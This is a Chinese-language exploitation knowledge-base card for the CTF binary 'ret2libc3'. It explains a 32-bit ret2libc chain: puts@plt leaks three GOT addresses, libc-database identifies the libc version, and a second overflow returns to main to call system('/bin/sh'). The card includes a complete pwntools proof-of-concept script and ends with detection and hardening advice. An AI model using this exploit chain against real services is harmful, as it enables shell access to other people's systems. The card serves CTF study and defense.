---
id: binary-pwn-stack-ret2libc-32bit-got-leak-libc-version-second-stage
title: 32 位 ret2libc GOT 三连泄露：puts@plt 泄 puts/gets/setvbuf、按低 12 位定 libc 版本、返回 main 二次溢出 system('/bin/sh')
type: scenario
domain: binary
path: binary/pwn/stack
technique: ret2libc-32bit-got-leak-libc-version-second-stage
tags:
- pwn
- stack
- ret2libc
- got-leak
- plt
- libc-database
- rop
- 32bit
- stack-alignment
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V372
  verified_at: '2026-11-09T06:11:41+08:00'
  notes: 已对照原文全文与图01-13核对：ret2libc3 无 system//bin/sh、gets 溢出 112、puts@plt(0x8048460)+pop ebp ret(0x80486ff) 连续泄 puts/gets/setvbuf、libc-database 低12位 F10/680/5d0 匹配 glibc-2.28-164.el8.i686、system=gets-0x2bc70（图07 offsets 0x6b680 vs 0x3fa10 差值确为0x2bc70）、binsh=gets+0xe815b、返回 main 第二次 104 填充（图10/12/13 esp 0xffffd50c vs 0xffffd554）、recvn(140)、图08 getshell 均与卡一致。与通用 ret2libc 卡(cos0.929，64位p64/pop rdi单次泄露概览)不是同一条具体链，force 新增理由成立；与 32 位 gets-bss 两阶段卡、close-stdout write 泄露卡亦不同。未本机复跑二进制；无 sources/source_url；CTF 二进制非组件版本--clear；dup-scan(11-08)早于建卡无 pair。
url: /docs/binary/pwn/stack/binary-pwn-stack-ret2libc-32bit-got-leak-libc-version-second-stage/
draft: false
kb_aliases:
- ret2libc3
- GOT 泄露 ret2libc
- puts@plt 泄露
- libc-database 低 12 位
- 112 与 104 栈对齐
- 返回 main 二次溢出
---

## 一句话结论

32 位动态链接程序开启 NX、二进制中既没有 `system` 也没有 `/bin/sh` 时，可用栈溢出第一次返回到 `puts@plt` 依次打印 `puts@got`/`gets@got`/`setvbuf@got`，按泄露地址的低 12 位在 libc-database 匹配 libc 版本并算出 `system`/`str_bin_sh` 偏移；链尾返回到 `main` 再次触发 `gets`，第二次用 104 字节填充（比第一次少 8 字节，因为第二次 main 的栈已 16 字节对齐）构造 `system("/bin/sh")` 获得 shell。

## 原理

- **动态链接与 GOT/PLT**：程序调用 libc 函数时先跳到 `.plt` 桩，桩通过 `.got.plt` 中的指针跳转；首次调用由动态链接器延迟绑定，把真实 libc 地址写入 GOT。`puts@plt` 可被 ROP 当作“打印函数”：按 cdecl 约定，返回地址后紧跟的参数即 `puts` 的第一个参数，把 `puts@got` 的地址传给它，`puts` 会把该 GOT 槽里的 4 字节 libc 函数地址当字符串打印出来（以 `\x00` 结尾）。
- **一次泄露多个函数**：用 `puts@plt + pop_ebp_ret + got_X` 重复三次，可连续泄露 `puts`、`gets`、`setvbuf` 的运行时地址；泄露越多，libc 版本匹配越准确。
- **libc 版本识别**：ASLR 只随机基址，页内偏移与 libc 文件一致；同一 libc 中函数的低 12 位固定。把泄露地址的低 3 个十六进制位（如 `F10`、`680`、`5d0`）作为 libc-database 的查询条件，得到候选版本；再用多个函数联合筛选。选定版本后查符号表：`system`、`str_bin_sh` 相对泄露函数的偏移差可直接加减（原文示例 `system = gets - 0x2bc70`、`/bin/sh = gets + 0xe815b`，对应 glibc 2.28 的偏移）。
- **返回 main 打第二枪**：泄露链末尾放 `main` 地址，让程序重新进入有 `gets` 的主函数；第二次溢出直接把返回地址改成 `system`，参数槽放 `/bin/sh` 地址。
- **两次偏移不同（112 vs 104）**：第一次进入 main 时 `push ebp; mov ebp,esp; and esp,0xfffffff0` 可能浪费 8 字节（原文首次 esp=0xffffd50c，Gets 缓冲区到返回地址为 0x70=112）；泄露后 `ret` 返回 main 时栈位置不同（第二次 esp=0xffffd554），`and` 后已 16 字节对齐，不再浪费，故第二次只需 104 字节填充。写死 112 会导致第二次链错位。
- **NUL 截断**：`puts` 遇到地址中的 `\x00` 会提前停止；若某次泄露不完整（常见于低字节含 0 的地址），多跑几次或换 `write` 泄露。
- **读包方式**：返回 main 后程序继续 `gets`，不会产生 EOF；用 `recvn(140)` 按预期长度读取，而不是 `recvall()`（后者会等待 EOF 卡死）。

## 触发条件

- 32 位 ELF（i386），存在可覆盖返回地址的栈溢出（原文 `gets` 读入，偏移 112），NX 开启、无 PIE、无 Canary 或可绕过。
- 程序导入 `puts`/`gets` 等函数，且 `.plt`/`.got` 地址固定（无 PIE）；存在 `pop ebp; ret` 或等价 gadget 用于串接多个 `puts@plt` 调用。
- 二进制中不存在 `system@plt`/`system` 符号与 `/bin/sh` 字符串（动态链接、IDA 只看到 PLT）。
- 能访问 libc-database 或已知目标 libc 版本；远程目标与本地 libc 可能不同，需要按泄露地址匹配。

## 利用步骤

1. `checksec` 确认 32 位、NX、无 PIE/Canary；`objdump -d --section=.plt` 或 pwntools `ELF.plt` 取 `puts@plt`、`gets@plt`，`ELF.got` 取对应 GOT 地址；`ROPgadget --only "pop|ret"` 找 `pop ebp; ret`。
2. 第一次 payload：`b"A"*112 + puts_plt + pop_ebp_ret + got_puts + puts_plt + pop_ebp_ret + got_gets + puts_plt + pop_ebp_ret + got_setvbuf + main`。
3. 发送后按固定长度读取（原文 `recvn(140)`），按分隔符切分，`u32` 还原三个泄露地址；运行多次对比，取低 12 位不变的地址。
4. 用 libc-database（或本地 libc）按低 12 位与多函数偏移匹配版本；计算 `system = leak - offset_diff`、`binsh = leak + offset_diff`。
5. 第二次 payload：`b"A"*104 + p32(system) + p32(fake_ret) + p32(binsh)`（32 位 cdecl，`system` 返回地址任意，参数紧跟）。
6. 发送 `"/bin/sh"` 进入交互 shell；若失败，检查第二次填充是否为 104、libc 偏移是否匹配、是否被 `\x00` 截断。

## PoC

```python
from pwn import *
binary = ELF("./ret2libc3", checksec=False)
sh = process("./ret2libc3")
puts_plt = p32(binary.plt.puts)
got_puts = p32(binary.got.puts)
got_gets = p32(binary.got.gets)
got_setvbuf = p32(binary.got.setvbuf)
pop_ebp_ret = p32(0x080486ff)
main = p32(binary.symbols.main)

payload  = b"A" * 112
payload += puts_plt + pop_ebp_ret + got_puts
payload += puts_plt + pop_ebp_ret + got_gets
payload += puts_plt + pop_ebp_ret + got_setvbuf
payload += main
sh.sendline(payload)

out = sh.recvn(140).split(b"?")[1].split(b"\n")
puts, gets, setvbuf = u32(out[0][:4]), u32(out[1][:4]), u32(out[2][:4])
# libc-database 按低 12 位匹配后（原文 glibc 2.28 示例）：
system = p32(gets - 0x2bc70)
binsh  = p32(gets + 0xe815b)
payload2 = b"A" * 104 + system + p32(0) + binsh
sh.sendline(payload2)
sh.sendline(b"/bin/sh")
sh.interactive()
```

## 变体与关联

- 变体：泄露函数换成 `write`（可指定长度，避免 NUL 截断）；泄露后不返回 main 而用 `__libc_csu_init` 一次布置 `system`；用 `one_gadget` 替代 `system+"/bin/sh"`。
- 关联：[[binary-pwn-stack-ret2libc]]（通用 ret2libc 概览）、[[binary-pwn-stack-ret2libc-no-binsh-gets-bss-two-stage]]（无 `/bin/sh` 时用 gets 写入 bss 的两阶段链）、[[binary-pwn-stack-close-stdout-blind-ret2libc-fd-restore]]（stdout 关闭时用 write fd2 泄露）、[[binary-pwn-stack-ret2plt-system-sh-local-root-service]]（二进制内含 system@plt 与字符串的 ret2plt）。
- 边界：Full RELRO 会让 GOT 只读但泄露仍可；PIE 需要先泄露代码基址；无 `pop ebp` gadget 需换其他寄存器清理；libc 版本匹配错误会导致 system/binsh 偏移全错。

## 检测与防御

- **检测**：崩溃/日志中出现连续 `puts@plt` 返回、GOT 地址被当作参数打印；ROP 链中 `pop ebp; ret` 重复出现；进程对 `.got.plt` 的读取异常。
- **防御**：开启 PIE + Full RELRO + Canary + NX，减少固定 gadget 与可写 GOT；用 libc 的 `-z now` 立即绑定；对输出做长度/内容异常监控；保持 libc 版本与服务端一致并及时更新。
- **利用面收敛**：避免在栈上可溢出的函数里处理不可信输入；用 `fgets`/`read` 限制长度；编译时启用 `-fstack-protector-all`、`-D_FORTIFY_SOURCE=2`。
